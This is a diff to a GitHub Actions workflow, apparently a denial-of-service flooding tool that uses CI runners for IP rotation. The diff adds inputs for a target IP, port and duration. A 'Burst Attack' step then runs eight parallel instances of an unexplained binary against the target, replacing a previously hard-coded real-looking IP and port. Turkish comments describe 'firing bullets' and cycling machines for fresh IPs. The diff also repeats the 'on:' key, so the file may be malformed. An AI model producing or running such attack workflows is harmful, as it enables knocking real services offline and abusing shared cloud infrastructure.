@@ -2,6 +2,20 @@ name: TekPoyraz - BLITZKRIEG (255x IP ROTATION) 😈
 
 on:
   workflow_dispatch:
+    inputs:
+      ip:
+        description: "Target IP"
+        required: true
+      port:
+        description: "Target Port"
+        required: true
+      time:
+        description: 'Sure (Saniye)'
+        required: true
+
+
+on:
+  workflow_dispatch:
 
 jobs:
   blitz:
@@ -21,9 +35,14 @@ jobs:
 
       - name: Burst Attack
         run: |
+          IP="${{ inputs.ip }}"
+          PORT="${{ inputs.port }}"
+          TIME="${{ inputs.time }}"
+          echo "IP=$IP PORT=$PORT TİME=$TİME"
+          PIDS=()
           # 10 saniye boyunca 8 koldan mermi basıyoruz
           for i in {1..8}; do
-            sudo timeout 10 ./5 46.203.182.28 30120 500 1000 99999 60 &
+            sudo timeout 10 ./5 "$IP" "$PORT" 500 1000 99999 "$TIME" &
           done
           
           # Makine 12 saniye sonra kapanacak, sıradaki taze IP gelecek
